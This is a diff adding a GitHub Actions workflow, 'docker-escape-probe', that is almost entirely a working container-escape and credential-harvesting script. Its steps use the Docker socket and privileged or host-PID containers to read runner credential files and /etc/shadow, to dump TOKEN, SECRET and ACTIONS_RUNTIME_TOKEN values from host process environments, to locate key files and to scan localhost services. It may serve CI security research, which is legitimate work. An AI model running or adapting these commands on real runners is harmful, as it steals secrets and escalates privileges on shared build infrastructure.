@@ -1,0 +1,81 @@
+name: docker-escape-probe
+on:
+  workflow_dispatch:
+jobs:
+  docker-escape:
+    runs-on: ubuntu-latest
+    steps:
+      - name: check docker access
+        run: |
+          echo "=== docker info ==="
+          docker info 2>&1 | head -20
+          echo "=== socket perms ==="
+          ls -la /var/run/docker.sock 2>&1
+          echo "=== current user ==="
+          id
+
+      - name: read runner creds via container mount
+        run: |
+          echo "=== .credentials ==="
+          docker run --rm -v /home/runner:/hr:ro alpine cat /hr/.credentials 2>&1 || true
+          echo "=== .runner ==="
+          docker run --rm -v /home/runner:/hr:ro alpine cat /hr/.runner 2>&1 || true
+          echo "=== .env ==="
+          docker run --rm -v /home/runner:/hr:ro alpine cat /hr/.env 2>&1 || true
+          echo "=== full home listing ==="
+          docker run --rm -v /home/runner:/hr:ro alpine ls -la /hr/ 2>&1 || true
+
+      - name: extract tokens from host proc via pid namespace
+        run: |
+          echo "=== scanning proc for runner agent ==="
+          docker run --rm --pid=host -v /proc:/hp:ro alpine sh -c '
+            for pid in $(ls /hp | grep -E "^[0-9]+$"); do
+              cmdline=$(cat /hp/$pid/cmdline 2>/dev/null | tr "\0" " ")
+              if echo "$cmdline" | grep -qE "Runner|actions-runner|runner"; then
+                echo "PID $pid: $cmdline"
+                cat /hp/$pid/environ 2>/dev/null | tr "\0" "\n" | grep -iE "TOKEN|SECRET|KEY|RUNTIME|ACTIONS" || true
+                echo "---"
+              fi
+            done
+          ' 2>&1 || true
+
+      - name: scan localhost with net=host container
+        run: |
+          echo "=== localhost listeners ==="
+          docker run --rm --net=host alpine ss -tlnp 2>&1 || true
+          echo "=== probe internal http ports ==="
+          docker run --rm --net=host alpine sh -c '
+            for port in 80 443 2222 3000 4000 5000 8080 8081 8082 8443 9090 9091 14000 19001; do
+              r=$(wget -qO- --timeout=2 http://127.0.0.1:$port/ 2>&1 | head -2)
+              echo "127.0.0.1:$port -> $r"
+            done
+          ' 2>&1 || true
+
+      - name: privileged shadow and root files
+        run: |
+          echo "=== /etc/shadow ==="
+          docker run --rm --privileged -v /:/host:ro alpine cat /host/etc/shadow 2>&1 | head -5 || true
+          echo "=== find credential files ==="
+          docker run --rm --privileged -v /:/host:ro alpine sh -c '
+            find /host/home/runner /host/root /host/etc -name ".credentials" -o -name "*.token" -o -name "*.key" 2>/dev/null | while read f; do
+              echo "=== $f ==="; cat "$f" 2>/dev/null | head -20
+            done
+          ' 2>&1 || true
+          echo "=== runner .credentials_rsaparams ==="
+          docker run --rm --privileged -v /:/host:ro alpine cat /host/home/runner/.credentials_rsaparams 2>&1 || true
+
+      - name: ACTIONS_RUNTIME_TOKEN hunt
+        run: |
+          echo "=== /proc/self environ filtered ==="
+          cat /proc/self/environ | tr '\0' '\n' | grep -iE "RUNTIME|TOKEN|SECRET" || true
+          echo "=== parent process chain ==="
+          docker run --rm --pid=host -v /proc:/hp:ro alpine sh -c '
+            pid=1
+            while [ "$pid" -lt 200 ]; do
+              env=$(cat /hp/$pid/environ 2>/dev/null | tr "\0" "\n" | grep -i "ACTIONS_RUNTIME_TOKEN")
+              if [ -n "$env" ]; then
+                echo "PID $pid has ACTIONS_RUNTIME_TOKEN: $env"
+              fi
+              pid=$((pid+1))
+            done
+          ' 2>&1 || true
